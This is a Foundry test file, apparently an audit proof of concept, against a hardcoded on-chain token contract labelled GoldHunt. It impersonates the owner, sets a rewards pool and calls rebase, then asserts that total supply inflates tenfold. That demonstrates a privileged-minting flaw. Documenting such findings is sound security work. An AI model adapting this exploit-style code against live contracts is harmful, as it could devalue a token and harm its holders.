```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IGoldHunt {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function rebase(uint256 multiple) external;
    function setRewardsPool(address _rewardsPool) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    address constant GOLD_HUNT = 0x6d3dd96f97b10fc86a7f8607704bbe9936083b89;
    IGoldHunt gh = IGoldHunt(GOLD_HUNT);

    function setUp() public {
        vm.label(GOLD_HUNT, "GoldHunt");
    }

    function testMintInflation() public {
        // Get the current owner (deployer)
        address owner = gh.owner();
        vm.label(owner, "Owner");
        vm.startPrank(owner);

        // Set a rewards pool (needed for rebase)
        address rewardsPool = address(0xdead);
        gh.setRewardsPool(rewardsPool);

        // Record initial total supply and owner balance
        uint256 supplyBefore = gh.totalSupply();
        uint256 ownerBalanceBefore = gh.balanceOf(owner);

        // Owner calls rebase with multiple = 10
        uint256 multiple = 10;
        gh.rebase(multiple);

        uint256 supplyAfter = gh.totalSupply();
        uint256 ownerBalanceAfter = gh.balanceOf(owner);

        // Assert total supply increased by factor of multiple
        // Note: rebase mints tokens to rewardsPool, not to owner, so owner balance unchanged
        assertEq(supplyAfter, supplyBefore * multiple, "Total supply should inflate by multiple");
        assertEq(ownerBalanceAfter, ownerBalanceBefore, "Owner balance should be unchanged (minted to rewardsPool)");

        vm.stopPrank();
    }
}
```
